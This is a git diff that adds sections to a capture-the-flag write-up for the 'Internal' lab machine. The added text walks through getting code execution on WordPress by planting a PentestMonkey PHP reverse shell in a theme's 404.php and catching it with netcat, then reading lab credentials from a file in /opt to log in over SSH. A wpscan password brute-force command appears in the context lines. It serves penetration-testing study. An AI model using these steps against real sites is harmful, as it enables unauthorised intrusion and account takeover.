@@ -76,6 +76,7 @@ wpscan --url http://internal.thm/wordpress/ -U admin -P /usr/share/wordlists/roc
 
 --> The credential was leaked: william:arnold147
 
+-----------------------------------------------------------------------------------------
 
 ### XSS ###
 + The vulnerability XSS appear in feature "Comments".
@@ -104,5 +105,78 @@ wpscan --url http://internal.thm/wordpress/ -U admin -P /usr/share/wordlists/roc
 ![alt text](/Hard/Internal/Images/image-10.png)
 
 ![alt text](/Hard/Internal/Images/image-11.png)
+
+-----------------------------------------------------------------------------------------------------
+
+### Exploit Themes to RCE ###
+
++ When we've checked in Site Health page, we've known that we had 2 themes was out of date:
+
+```bash
+### wp-active-theme ###
+
+name: Twenty Seventeen (twentyseventeen)
+version: 2.3
+author: the WordPress team
+author_website: https://wordpress.org/
+parent_theme: none
+theme_features: automatic-feed-links, title-tag, post-thumbnails, menus, html5, post-formats, custom-logo, customize-selective-refresh-widgets, editor-style, editor-styles, wp-block-styles, responsive-embeds, starter-content, custom-header, widgets
+theme_path: /var/www/html/wordpress/wp-content/themes/twentyseventeen
+
+### wp-themes-inactive (2) ###
+
+Twenty Nineteen: version: 1.5, author: the WordPress team (latest version: 1.6)
+Twenty Twenty: version: 1.2, author: the WordPress team (latest version: 1.4)
+
+### wp-plugins-inactive (2) ###
+
+Akismet Anti-Spam: version: 4.1.5, author: Automattic (latest version: 4.1.6)
+Hello Dolly: version: 1.7.2, author: Matt Mullenweg
+
+### wp-filesystem ###
+
+wordpress: not writable
+wp-content: not writable
+uploads: not writable
+plugins: not writable
+themes: not writable
+```
+--> Researching we know that theme is out of date will have the potential vulnearability in file "404.php". We are able to edit PHP file to RCE.
+
++ Checking 2 themes is out of date, theme "Twenty Nineteen" can't be edited but theme "Twenty Twenty" can be edited.
++ First we will active the theme "Twenty Twenty" replace theme "Twenty Seventeen". After we will edit file 404.php to RCE.
++ We can choose the webshell.php of PentestMonkey.
++ Update file successfully, we access the URL "http://internal.thm/wordpress/wp-content/themes/twentytwenty/404.php" and open netcat to catch the opened PORT.
+
+![alt text](image.png)
+
++ RCE successfully and now we have to find the information to login user "aubreanna".
++ After a period of searching, we've found the interesting file in /opt.
+
+```bash
+www-data@internal:/$ cd /opt
+cd /opt
+www-data@internal:/opt$ ls
+ls
+containerd
+wp-save.txt
+www-data@internal:/opt$ cat wp-save.txt
+cat wp-save.txt
+Bill,
+
+Aubreanna needed these credentials for something later.  Let her know you have them and where they are.
+
+aubreanna:bubb13guM!@#123
+www-data@internal:/opt$ 
+```
+
+--> We've found the credential aubreanna:bubb13guM!@#123. We use it to login SSH.
+
+![alt text](image-1.png)
+
+-------------------------------------------------------------------------------------
+
+### PRIVILEGE ESCALTION ROOT ###
+
 
 
